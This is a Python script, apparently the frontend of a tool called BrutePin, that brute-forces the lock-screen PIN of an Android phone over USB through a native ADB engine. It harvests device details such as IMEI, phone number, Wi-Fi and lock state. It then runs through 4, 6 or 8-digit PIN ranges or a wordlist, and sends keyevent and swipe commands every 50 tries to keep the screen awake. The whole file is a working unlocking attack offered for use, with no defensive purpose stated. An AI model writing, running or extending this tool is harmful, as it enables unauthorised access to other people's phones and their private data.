#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BrutePin v1.1 — Pure Native PIN Brute Force
Murni tools sendiri, tanpa ADB binary, tanpa TCP.
Komunikasi langsung via USB menggunakan C engine native ADB protocol.

Semua engine C/C++/Python bersatu padu:
  C   → deep scan, native ADB USB, precision digit input, screen monitor
  C++ → strategy engine (AI+Common+Device+Sequential), adaptive timer,
         device profile, progress tracking, performance log
  Python → frontend orchestrator: banner, USB detect, deep scan display,
            menu, batch brute via C, real-time streaming output
"""

import json
import os
import subprocess
import sys
import threading
import time

R = "\033[0;31m"
G = "\033[0;32m"
Y = "\033[1;33m"
C = "\033[0;36m"
B = "\033[1m"
N = "\033[0m"

CORE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "core")
C_BIN = os.path.join(CORE_DIR, "brutepin")
CONNECT_SH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "connect.sh")
STATE_FILE = ".brutepin_state"

BANNER = R + """
  ██████  ██████  ██    ██ ████████ ███████  ██████  ██ ███    ██
  ██   ██ ██   ██ ██    ██    ██    ██      ██       ██ ████   ██
  ██████  ██████  ██    ██    ██    █████   ██   ███ ██ ██ ██  ██
  ██   ██ ██   ██ ██    ██    ██    ██      ██    ██ ██ ██  ██ ██
  ██████  ██   ██  ██████     ██    ███████  ██████  ██ ██   ████
""" + N + """  """ + B + """Pure Native""" + N + """ — tanpa ADB binary, komunikasi langsung via USB
  =================================================================
"""

SPIN_CHARS = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"


## ── Helpers ──

def _getch():
    import termios, tty
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        return sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)

def getch():
    if os.name == "nt":
        import msvcrt
        return msvcrt.getch().decode()
    return _getch()


class Spinner:
    def __init__(self, msg="Working"): self.msg = msg; self._r = False; self._t = None
    def __enter__(self): self.start(); return self
    def __exit__(self, *a): self.stop()
    def _spin(self):
        i = 0
        while self._r:
            sys.stdout.write(f"\r  {SPIN_CHARS[i%len(SPIN_CHARS)]} {self.msg}... ")
            sys.stdout.flush(); time.sleep(0.1); i += 1
    def start(self):
        self._r = True
        self._t = threading.Thread(target=self._spin, daemon=True)
        self._t.start()
    def stop(self):
        self._r = False
        if self._t: self._t.join()
        sys.stdout.write("\r" + " " * 60 + "\r"); sys.stdout.flush()


def menu(items, prompt="Select PIN length:"):
    """Arrow-key navigable menu with hover highlight."""
    sel = 0
    n = len(items)
    print(f"\n  {B}{prompt}{N}\n")
    for i, item in enumerate(items):
        hl = f"\033[7m{B}" if i == sel else " "
        print(f"     {hl} {item} \033[0m")
    while True:
        k = getch()
        if k == "\x1b":
            k2 = getch()
            if k2 == "[":
                k3 = getch()
                if k3 == "A": sel = (sel - 1) % n
                elif k3 == "B": sel = (sel + 1) % n
        elif k in ("\r", "\n"): break
        elif k == "\x03": raise KeyboardInterrupt
        for _ in range(n): sys.stdout.write("\033[F\033[K")
        for i, item in enumerate(items):
            hl = f"\033[7m{B}" if i == sel else " "
            sys.stdout.write(f"     {hl} {item} \033[0m\n")
        sys.stdout.flush()
    for _ in range(n + 1): sys.stdout.write("\033[F\033[K")
    sys.stdout.flush()
    return sel


def cbin(cmd, timeout=15):
    """Run C binary and return stdout."""
    try:
        r = subprocess.run([C_BIN] + cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout, r.returncode
    except subprocess.TimeoutExpired:
        return "", -1
    except FileNotFoundError:
        return "", -2


def parse_deep_scan(output):
    """Parse JSON from deep scan output (after -----JSON_BEGIN----- marker)."""
    if "-----JSON_BEGIN-----" not in output:
        return {}
    json_str = output.split("-----JSON_BEGIN-----")[1].strip()
    try:
        return json.loads(json_str)
    except json.JSONDecodeError:
        return {}


## ── Detect USB ──

def wait_for_device(timeout=60):
    """Wait for Android device via USB sysfs. Shows spinner."""
    av = {"18d1", "04e8", "2717", "12d1", "22d9", "2d95", "1004",
          "054c", "22b8", "0421", "2a70", "0e8d", "05c6"}
    t0 = time.time()
    while time.time() - t0 < timeout:
        sp = "/sys/bus/usb/devices"
        if os.path.isdir(sp):
            for name in os.listdir(sp):
                if "-" not in name and ":" not in name and "usb" not in name: continue
                dp = os.path.join(sp, name)
                if not os.path.isdir(dp): continue
                try:
                    with open(os.path.join(dp, "idVendor")) as f: vid = f.read().strip().lower()
                except (OSError, IOError): continue
                if vid in av:
                    man = prod = serial = ""
                    for f in ("manufacturer", "product", "serial"):
                        try:
                            with open(os.path.join(dp, f)) as fp: v = fp.read().strip()
                            if f == "manufacturer": man = v
                            elif f == "product": prod = v
                            else: serial = v
                        except (OSError, IOError): pass
                    return {"vid": vid, "man": man, "prod": prod, "serial": serial}
        time.sleep(1)
    return None


## ── Deep Scan ──

def deep_scan():
    """Run C binary deep scan, return info dict + formatted text."""
    out, code = cbin(["--deep-scan"])
    if code != 0:
        return None, ""
    info = parse_deep_scan(out)
    if "-----JSON_BEGIN-----" in out:
        formatted = out.split("-----JSON_BEGIN-----")[0].strip()
    else:
        formatted = out.strip()
    return info, formatted


def print_device_info(info):
    """Display full device info — ALL fields from C deep scan."""
    if not info: return

    sections = [
        ("VENDOR / MODEL", [
            ("Vendor", info.get('vendor','?')),
            ("Model", info.get('model','?')),
            ("Serial", info.get('serial','?')),
            ("Chipset", f"{info.get('chipset_vendor','?')} {info.get('chipset_name','?')}"),
            ("Platform", info.get('platform','?')),
            ("Hardware", info.get('hardware','?')),
            ("Product", info.get('product','?')),
            ("Device", info.get('device','?')),
        ]),
        ("SYSTEM", [
            ("Android", f"{info.get('android','?')} (SDK {info.get('sdk','?')})"),
            ("Build ID", info.get('build_id','?')),
            ("Fingerprint", str(info.get('fingerprint','?'))[:80]),
            ("Security Patch", info.get('security_patch','?')),
            ("Bootloader", info.get('bootloader','?')),
            ("Baseband", info.get('baseband','?')),
            ("Kernel", info.get('kernel','?')),
            ("SELinux", info.get('selinux','?')),
        ]),
        ("CPU / MEMORY", [
            ("CPU", f"{info.get('cpu_abi','?')} | {info.get('cpu_cores','?')} cores | {info.get('cpu_maxfreq','?')}"),
            ("RAM", info.get('ram','?')),
            ("Storage", info.get('storage','?')),
        ]),
        ("DISPLAY", [
            ("Screen", f"{info.get('screen','?')} @ {info.get('density','?')} dpi"),
            ("GPU", info.get('gpu','?')),
            ("Refresh Rate", f"{info.get('display_hz','?')} Hz"),
        ]),
        ("BATTERY", [
            ("Level", f"{info.get('battery','?')}%"),
            ("Status", info.get('battery_status','?')),
            ("Health", info.get('battery_health','?')),
            ("Temperature", f"{info.get('battery_temp','?')}°C"),
        ]),
        ("TELEPHONY", [
            ("IMEI1", info.get('imei1','?')),
            ("IMEI2", info.get('imei2','?')),
            ("Phone", info.get('phone','?')),
            ("Network", f"{info.get('network_operator','?')} ({info.get('network_type','?')})"),
            ("SIM", info.get('sim_operator','?')),
        ]),
        ("SECURITY", [
            ("Lock Type", info.get('lock_type','?')),
            ("Status", f"{R}LOCKED{N}" if info.get('locked', False) else f"{G}UNLOCKED{N}"),
            ("FRP", info.get('frp_status','?')),
            ("Encryption", info.get('crypto_state','?')),
            ("SELinux", info.get('selinux','?')),
            ("OEM Unlock", info.get('oem_unlock','?')),
        ]),
        ("BIOMETRICS", [
            ("Available", info.get('biometrics','?')),
            ("Camera", info.get('camera','?')),
        ]),
        ("CONNECTIVITY", [
            ("WiFi", f"{info.get('wifi_ssid','?')} ({info.get('mac','?')})"),
            ("Bluetooth", info.get('bt_info','?')),
            ("NFC", info.get('nfc_state','?')),
        ]),
    ]

    print(f"\n{'='*60}")
    for title, fields in sections:
        print(f"  {B}{title}{N}")
        print(f"  {'='*56}")
        for label, value in fields:
            if value and value != '?' and value != 'None':
                print(f"    {label:15s}: {value}")
    print(f"{'='*60}\n")

    # Profile info from deep scan
    pb = info.get('profile_brand','')
    pg = info.get('profile_grid',0)
    pd = info.get('profile_delay',0)
    if pb:
        grid_names = ["AOSP","Samsung","Xiaomi","OPPO","Vivo",
                      "Huawei","Motorola","Sony","Nokia","ASUS",
                      "Tecno","Infinix","Advan","Honor"]
        gn = grid_names[pg] if 0 <= pg < len(grid_names) else "Auto"
        print(f"  {B}DEVICE PROFILE{N}")
        print(f"  {'='*56}")
        print(f"    Brand         : {pb}")
        print(f"    Grid Preset   : {gn}")
        print(f"    Base Delay    : {pd:.0f} ms")
        print(f"{'='*60}\n")


## ── PIN Brute Engine ──

class BruteEngine:
    def __init__(self, digits=4, delay_ms=3):
        self.digits = digits
        self.delay_ms = delay_ms
        self.found = False
        self.pin = ""
        self.keep = True

    def _enter_pin(self, pin):
        out, code = cbin(["--try-pin", pin], timeout=10)
        return code == 0, out.strip()

    def run(self, start=0, end=0):
        """Run batch brute via C binary — single subprocess call."""
        total = 10 ** self.digits
        s = max(start, 0)
        e = min(end, total) if end > 0 else total
        if s <= 0 and e >= total: e = total

        print(f"\n  {B}[*]{N} {self.digits}-digit brute: {s:0{self.digits}d} - {e-1:0{self.digits}d}")
        print(f"  {B}[*]{N} Total: {e-s:,} PINs | Mode: Smart Batch (C engine)")
        print(f"  {B}[*]{N} Strategy: AI Markov → Common → Device → Sequential\n")

        # Call C --batch mode: internally deep scans, profiles device,
        # runs strategy engine, adaptive timer, screen watch, progress tracker
        try:
            proc = subprocess.Popen(
                [C_BIN, "--batch", str(self.digits), "0", str(s), str(e)],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1
            )
        except FileNotFoundError:
            print(f"\n  {R}[-]{N} C binary not found: {C_BIN}")
            return False

        # Stream output in real-time
        t0 = time.time()
        for line in proc.stdout:
            line = line.rstrip()
            if not line:
                continue
            if "FOUND" in line and "PIN" in line:
                self.found = True
                # Extract PIN from line like "[!!!] PIN FOUND: 1234"
                import re
                m = re.search(r'PIN FOUND:\s*(\d+)', line)
                if m:
                    self.pin = m.group(1)
            if "NOT_FOUND" in line or "tidak ditemukan" in line:
                pass
            print(line)
            sys.stdout.flush()

        proc.wait()
        elapsed = time.time() - t0

        # Check return code for found
        if proc.returncode == 0:
            self.found = True
            # PIN was printed by C binary

        if not self.found:
            print(f"\n{Y}[-] PIN tidak ditemukan ({elapsed:.0f}s).{N}")

        return self.found

    def run_wordlist(self, path):
        """Wordlist brute via per-PIN C calls."""
        try:
            with open(path) as f:
                pins = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        except IOError as e:
            print(f"  {R}[-]{N} {e}")
            return False
        total = len(pins)
        if total == 0:
            print(f"  {Y}[-]{N} Empty wordlist.")
            return False
        print(f"\n  {B}[*]{N} Wordlist: {total:,} entries")

        t0 = time.time()
        for idx, pin in enumerate(pins):
            if not self.keep: break
            ok, out = self._enter_pin(pin)
            if ok:
                self.found = True
                self.pin = pin
                elapsed = time.time() - t0
                print(f"\n\n{G}{'='*60}{N}")
                print(f"{G}[!!!] PIN FOUND: {B}{pin}{N}")
                print(f"{G}[!!!] Waktu: {elapsed:.0f}s | Percobaan: {idx+1:,}{N}")
                print(f"{G}{'='*60}{N}\n")
                return True
            if (idx + 1) % 50 == 0:
                cbin(["--adb-shell", "input keyevent 224"], timeout=5)
                time.sleep(0.2)
                cbin(["--adb-shell", "input swipe 500 1500 500 500 200"], timeout=5)
                time.sleep(0.15)
            if self.delay_ms > 0: time.sleep(self.delay_ms / 1000.0)
            elapsed = time.time() - t0
            rate = (idx + 1) / elapsed if elapsed > 0 else 0
            sys.stdout.write(f"\r  [WL] {idx+1}/{total} {pin} | {rate:.0f}/s | {elapsed:.0f}s  ")
            sys.stdout.flush()
        print(f"\n{Y}[-] Not found.{N}")
        return False


## ── Main ──

def main():
    # ── 1. Banner ──
    print(BANNER)

    # ── 2. Wait for USB device ──
    print(f"  {B}[*]{N} Menunggu kabel USB terhubung...")
    with Spinner("Detecting USB"):
        dev = wait_for_device(60)
    if not dev:
        print(f"\n  {R}[-]{N} Tidak ada device Android terdeteksi.")
        print(f"  {Y}[!]{N} Colok kabel USB, pastikan USB debugging ON.")
        sys.exit(1)
    print(f"\n  {G}[+]{N} Device terdeteksi!")
    print(f"       {dev.get('vid','?')}  {dev.get('man','?')} {dev.get('prod','?')}  s/n={dev.get('serial','?')[:16]}")

    # ── 3. Deep scan via C binary ──
    print(f"\n  {B}[*]{N} Deep scanning...")
    with Spinner("Mengumpulkan info device"):
        time.sleep(0.5)
    info, formatted = deep_scan()
    if not info:
        print(f"\n  {R}[-]{N} Deep scan gagal. Pastikan ADB debugging ON di HP.")
        print(f"  {Y}[!]{N} Buka Developer Options -> USB Debugging -> accept RSA key.")
        sys.exit(1)
    print_device_info(info)

    # ── 4. Lock check ──
    if not info.get("locked", True):
        print(f"  {G}[!] Device tidak terkunci!{N}\n")
        sys.exit(0)

    # ── 5. Menu ──
    items = [
        f"  4-digit PIN  (0000-9999)        {C}10,000 PINs{N}",
        f"  6-digit PIN  (000000-999999)    {C}1,000,000 PINs{N}",
        f"  8-digit PIN  (00000000-99999999){C}100,000,000 PINs{N}",
        f"  Custom file / wordlist          {C}*.txt{N}",
        "  Quit",
    ]
    sel = menu(items)
    if sel == 4:
        print(f"\n  {Y}[-]{N} Selesai.\n")
        sys.exit(0)

    digits = [4, 6, 8][sel] if sel < 3 else 0
    engine = BruteEngine(digits=digits, delay_ms=3)

    if sel == 3:
        path = input(f"\n  {B}Path{N} ke wordlist: ").strip()
        if not path:
            print(f"  {Y}[-]{N} Tidak ada file.")
            sys.exit(1)
        engine.run_wordlist(path)
    else:
        engine.run()

    # ── 6. Cleanup ──
    if not engine.found:
        print(f"\n  {Y}[-]{N} PIN tidak ditemukan.\n")
    try:
        os.remove(STATE_FILE)
    except (OSError, IOError): pass


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {Y}[-]{N} Interrupted.\n")
        sys.exit(1)
    except BrokenPipeError:
        sys.exit(1)
